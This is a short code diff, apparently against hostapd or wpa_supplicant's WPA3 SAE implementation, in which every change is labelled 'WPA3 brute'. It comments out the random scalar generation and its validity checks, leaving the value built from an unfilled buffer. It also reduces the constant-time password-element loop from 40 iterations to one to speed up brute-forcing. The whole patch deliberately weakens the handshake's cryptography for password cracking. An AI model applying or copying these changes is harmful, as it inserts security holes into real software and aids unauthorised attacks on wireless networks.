@@ -154,12 +154,15 @@ static struct crypto_bignum * sae_get_rand(struct sae_data *sae)
 	if (order_len > sizeof(val))
 		return NULL;
 
+/* WPA3 brute: Save randomisation initialisation
 	for (;;) {
 		if (iter++ > 100 || random_get_bytes(val, order_len) < 0)
 			return NULL;
 		if (order_len_bits % 8)
 			buf_shift_right(val, order_len, 8 - order_len_bits % 8);
+*/
 		bn = crypto_bignum_init_set(val, order_len);
+/* WPA3 brute: save time checking result
 		if (bn == NULL)
 			return NULL;
 		if (crypto_bignum_is_zero(bn) ||
@@ -172,6 +175,7 @@ static struct crypto_bignum * sae_get_rand(struct sae_data *sae)
 	}
 
 	os_memset(val, 0, order_len);
+*/
 	return bn;
 }
 
@@ -463,7 +467,8 @@ static int sae_derive_pwe_ecc(struct sae_data *sae, const u8 *addr1,
 			      const u8 *addr2, const u8 *password,
 			      size_t password_len, const char *identifier)
 {
-	u8 counter, k = 40;
+	//u8 counter, k = 40; // WPA3 brute: remove constant time loop
+	u8 counter, k = 1;
 	u8 addrs[2 * ETH_ALEN];
 	const u8 *addr[3];
 	size_t len[3];
